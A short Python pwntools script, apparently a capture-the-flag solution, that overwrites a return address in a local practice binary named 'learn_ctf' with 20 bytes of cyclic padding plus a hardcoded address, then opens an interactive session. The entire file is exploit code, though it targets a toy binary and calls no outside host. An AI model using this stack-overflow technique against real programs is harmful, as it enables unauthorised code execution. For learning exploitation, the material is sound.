#!/usr/bin/python3
from time import sleep
from pwn import *

class Pwn:
    def __init__(self,return_addr,padding):
        self.ret = return_addr
        self.padding = padding
        self.shellcode = self.padding + self.ret

    def exploit(self):
        try:
            self.payload = self.shellcode
            if self.payload:
                try:
                    self.progress = log.progress("")
                    self.progress.status("checking for vulnerability..")
                    sleep(3)
                    
                    def start_process(self):
                        elf = process("./learn_ctf")
                        elf.sendline(self.payload)
                        elf.interactive()

                    start_process(self)
                    return 0

                except Exception as e:
                    self.progress.failure(e)
                    return 2
            else:
                self.p = log.progress("")
                self.p.failure("failed to create a good payload")
                exit()
        except:
            return 2

if __name__== '__main__':
    padding = cyclic(20)
    return_addr = p64(0x0000000000401176)
    pwn = Pwn(return_addr,padding)
    pwn.exploit()
